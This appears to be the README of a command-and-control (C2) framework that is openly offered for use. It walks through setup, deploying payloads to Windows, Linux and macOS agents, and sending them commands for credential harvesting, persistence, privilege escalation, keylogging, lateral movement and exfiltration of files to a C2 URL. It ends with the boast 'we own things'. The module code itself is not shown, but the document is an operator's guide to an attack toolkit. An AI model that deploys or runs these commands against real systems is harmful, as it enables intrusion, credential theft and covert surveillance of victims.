This is the start of a c2 server and client (currently windows) deployment. It's from our community as a whole. More functionality to follow in due course. 

# Installation and Setup

Clone the Repository git clone https://github.com/4lph4-01/share

Create a Virtual Environment python -m venv venv within the sovereign-c2 directory

source venv/bin/activate (in a new terminal #source venv/bin/activate in the same directory, but separate terminal window). Results of the initial supported powershell commands sent will output to the check-in terminal window. 

On Windows, use venv\Scripts\activate

Install Dependencies pip install -r requirements.txt

Prepare Payloads (If necessary) Ensure your payload scripts are in the payloads directory:
    payloads/macos_payload.sh (Work in progress)
    payloads/linux_payload.sh (Work in progress)
    payloads/windows_payload.ps1 (Work in progress)

Running the C2 Server

python c2_server.py CLI Usage

List Agents python cli/cli.py list-agents

Deploy Payload python cli/cli.py deploy-payload <agent_type> Replace <agent_type> with macos, linux, or windows.

Select and Send Commands to an Agent python cli/cli.py select-agent You can specify the agent ID directly or choose from a list of available agents.

Generate Report python cli/cli.py generate-report

Send a Specific Command python cli/cli.py send-command <agent_id>

Supported Commands

Credential Harvesting python cli/cli.py send-command <agent_id> cred_harvest

Persistence python cli/cli.py send-command <agent_id> persistence

Privilege Escalation python cli/cli.py send-command <agent_id> priv_escalation

Reconnaissance python cli/cli.py send-command <agent_id> reconnaissance

Data Exfiltration python cli/cli.py send-command <agent_id> exfiltrate <file_path> <c2_url> Replace <file_path> and <c2_url> with the actual file path and C2 URL.

Keylogging python cli/cli.py send-command <agent_id> keylogging

Lateral Movement python cli/cli.py send-command <agent_id> lateral_movement Modules Directory Structure Ensure you have a modules directory with the following structure and content: modules/ cred_harvest.py persistence.py priv_escalation.py reconnaissance.py exfiltration.py keylogging.py lateral_movement.py

# By the way, we own things.....
